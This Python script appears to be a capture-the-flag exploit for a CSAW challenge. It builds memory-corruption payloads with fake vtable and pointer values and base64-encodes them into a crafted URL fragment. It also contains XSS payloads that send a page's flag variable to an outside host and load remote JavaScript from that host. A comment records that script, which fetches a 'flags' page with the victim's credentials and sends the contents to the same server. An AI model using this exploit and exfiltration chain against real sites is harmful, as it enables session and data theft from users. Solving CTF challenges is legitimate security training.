from pwn import *
import json
import base64

AUTHED_VTABLE = 0xde4

JS_GLOBAL_STRING = 0x0000134b
USERNAME_PTR = 0x00501f88

API_PTR = 0x00502080
FLAG_PTR = 0x005020b8


def flag1():
    pl = p32(AUTHED_VTABLE)
    pl += p32(API_PTR)
    pl += p32(0x11)
    pl += p32(0x80000020)
    pl += p32(FLAG_PTR)
    pl += p32(0x1b)
    pl += p32(0x80000020)

    pl = base64.b64encode(pl)

    plays = ["MSwx","MSwy","MCwy"]
    plays.append(pl)
    plays.append(base64.b64encode('2,2'))
    o = {'plays':plays, 'api':'http://itszn.com:1337'}
    print base64.b64encode(json.dumps(o))

def flag2():
    pl = p32(0x41414141)
    #pl += p32(0x41)
    #pl += p32(0)
    #pl += p32(0x01000000)
    pl += p32(USERNAME_PTR)
    pl += p32(0x11)
    pl += p32(0x80000020)

    pl += p32(0x41)
    pl += p32(0)
    pl += p32(0x01000000)

    pl = base64.b64encode(pl)

    plays = []
    plays.append("MSwx")
    plays.append("MSwx")
    plays.append("MSwx")
    plays.append(pl)
    plays.append("MSwx")
    plays.append(base64.b64encode('1,1'))

    xss = 'document.location=`http://itszn.com:1337/${window.flag2}`//'
    xss = 's=document.createElement("script");s.src="http://itszn.com/pl.js";document.head.append(s)//'
    # In http://itszn.com/pl.js:
    #     fetch("flags",{credentials: "include"}).then(r=>r.text()).then(f=>fetch("http://itszn.com:1337?"+f));

    #xss = 'alert(`The second flag is ${window.flag2}`)///////////'
    print hex(len(xss))
    #xss = 'document.location=`http://itszn.com/${window.flag2)}`//'

    pl = p32(JS_GLOBAL_STRING) # Global value
    pl += p32(len(xss)) # length
    pl += p32(0x80000000|0x100)
    pl = base64.b64encode(pl)
    plays.append(pl)


    plays.append({'name':xss})
    plays.append(base64.b64encode('1,1'))

    o = {'plays':plays, 'api':'http://itszn.com'}
    o = {'plays':plays, 'api':'A'}
    print 'http://vm/csaw/index.html#'+base64.b64encode(json.dumps(o))

flag1()
flag2()
